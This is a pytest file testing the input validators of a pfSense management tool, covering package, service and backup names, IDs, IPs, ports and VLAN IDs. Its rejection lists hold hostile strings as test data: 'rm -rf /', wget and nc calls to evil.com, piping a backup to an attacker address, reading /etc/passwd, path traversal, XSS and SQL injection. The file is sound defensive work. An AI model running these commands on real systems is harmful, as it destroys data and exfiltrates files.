"""Tests for pfSense validation utilities."""

import pytest
from src.utils.validation import (
    validate_package_name,
    validate_service_name,
    validate_backup_name,
    validate_id,
    validate_ip_address,
    validate_port,
    validate_vlan_id
)


class TestPackageNameValidation:
    """Test package name validation."""
    
    def test_valid_package_names(self):
        """Test valid package names."""
        valid_names = [
            "pfSense-pkg-haproxy",
            "openvpn-client-export",
            "snort",
            "suricata",
            "wireguard",
            "package-1.0",
            "test_package",
            "my-package.tar"
        ]
        
        for name in valid_names:
            assert validate_package_name(name) is True, f"Expected '{name}' to be valid"
    
    def test_invalid_package_names(self):
        """Test invalid package names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "package; rm -rf /",  # Command injection
            "package && wget evil.com/backdoor.sh",  # Command injection
            "package | cat /etc/passwd",  # Command injection
            "package`whoami`",  # Command injection
            "package$((1+1))",  # Command injection
            "../../../etc/passwd",  # Path traversal
            "package<script>alert(1)</script>",  # XSS attempt
            "package'OR'1'='1",  # SQL injection pattern
            "a" * 300,  # Too long
        ]
        
        for name in invalid_names:
            assert validate_package_name(name) is False, f"Expected '{name}' to be invalid"


class TestServiceNameValidation:
    """Test service name validation."""
    
    def test_valid_service_names(self):
        """Test valid service names."""
        valid_names = [
            "openvpn",
            "ipsec",
            "wireguard",
            "haproxy",
            "snort",
            "suricata",
            "nginx",
            "my-service",
            "test_service"
        ]
        
        for name in valid_names:
            assert validate_service_name(name) is True, f"Expected '{name}' to be valid"
    
    def test_invalid_service_names(self):
        """Test invalid service names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "service; reboot",  # Command injection
            "service && rm -rf /",  # Command injection
            "service | nc evil.com 1234",  # Command injection
            "service`id`",  # Command injection
            "service$(cat /etc/passwd)",  # Command injection
            "../../../etc/init.d/evil",  # Path traversal
            "service.with.dots",  # Dots not allowed in service names
            "a" * 150,  # Too long
        ]
        
        for name in invalid_names:
            assert validate_service_name(name) is False, f"Expected '{name}' to be invalid"


class TestBackupNameValidation:
    """Test backup name validation."""
    
    def test_valid_backup_names(self):
        """Test valid backup names."""
        valid_names = [
            "backup-2024-01-01",
            "config.xml",
            "my_backup.tar.gz",
            "backup-v1.0.0",
            "test-backup",
            "backup_20240101"
        ]
        
        for name in valid_names:
            assert validate_backup_name(name) is True, f"Expected '{name}' to be valid"
    
    def test_invalid_backup_names(self):
        """Test invalid backup names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "backup; rm backup.xml",  # Command injection
            "backup && cat /etc/passwd",  # Command injection
            "backup | mail attacker@evil.com",  # Command injection
            "backup`whoami`",  # Command injection
            "../../../etc/passwd",  # Path traversal
            "backup/../../../important.xml",  # Path traversal
            "a" * 300,  # Too long
        ]
        
        for name in invalid_names:
            assert validate_backup_name(name) is False, f"Expected '{name}' to be invalid"


class TestIdValidation:
    """Test ID validation."""
    
    def test_valid_ids(self):
        """Test valid IDs."""
        valid_ids = [
            "rule-123",
            "vlan-100",
            "interface_wan",
            "fw-rule-1",
            "NAT-1",
            "test_id"
        ]
        
        for id_val in valid_ids:
            assert validate_id(id_val) is True, f"Expected '{id_val}' to be valid"
    
    def test_invalid_ids(self):
        """Test invalid IDs with injection attempts."""
        invalid_ids = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "id; rm -rf /",  # Command injection
            "id && reboot",  # Command injection
            "id | cat /etc/passwd",  # Command injection
            "id`whoami`",  # Command injection
            "../../../etc/passwd",  # Path traversal
            "id/../../important",  # Path traversal
            "id with spaces",  # Spaces not allowed
            "id.with.too.many.dots.for.safety",  # Dots allowed but validate length
            "a" * 150,  # Too long
        ]
        
        for id_val in invalid_ids:
            assert validate_id(id_val) is False, f"Expected '{id_val}' to be invalid"


class TestIPAddressValidation:
    """Test IP address validation."""
    
    def test_valid_ip_addresses(self):
        """Test valid IP addresses."""
        valid_ips = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "8.8.8.8",
            "255.255.255.255",
            "0.0.0.0",
            "::1",
            "2001:0db8:85a3::8a2e:0370:7334"
        ]
        
        for ip in valid_ips:
            assert validate_ip_address(ip) is True, f"Expected '{ip}' to be valid"
    
    def test_invalid_ip_addresses(self):
        """Test invalid IP addresses."""
        invalid_ips = [
            "",
            "256.256.256.256",
            "192.168.1",
            "192.168.1.1.1",
            "not-an-ip",
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && reboot"
        ]
        
        for ip in invalid_ips:
            assert validate_ip_address(ip) is False, f"Expected '{ip}' to be invalid"


class TestPortValidation:
    """Test port validation."""
    
    def test_valid_ports(self):
        """Test valid ports."""
        valid_ports = [1, 80, 443, 8080, 65535, "80", "443"]
        
        for port in valid_ports:
            assert validate_port(port) is True, f"Expected port '{port}' to be valid"
    
    def test_invalid_ports(self):
        """Test invalid ports."""
        invalid_ports = [0, 65536, -1, 99999, "not-a-port", "", None]
        
        for port in invalid_ports:
            assert validate_port(port) is False, f"Expected port '{port}' to be invalid"


class TestVLANIDValidation:
    """Test VLAN ID validation."""
    
    def test_valid_vlan_ids(self):
        """Test valid VLAN IDs."""
        valid_ids = [1, 100, 4094, "1", "100", "4094"]
        
        for vlan_id in valid_ids:
            assert validate_vlan_id(vlan_id) is True, f"Expected VLAN ID '{vlan_id}' to be valid"
    
    def test_invalid_vlan_ids(self):
        """Test invalid VLAN IDs."""
        invalid_ids = [0, 4095, -1, 10000, "not-a-vlan", "", None]
        
        for vlan_id in invalid_ids:
            assert validate_vlan_id(vlan_id) is False, f"Expected VLAN ID '{vlan_id}' to be invalid"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
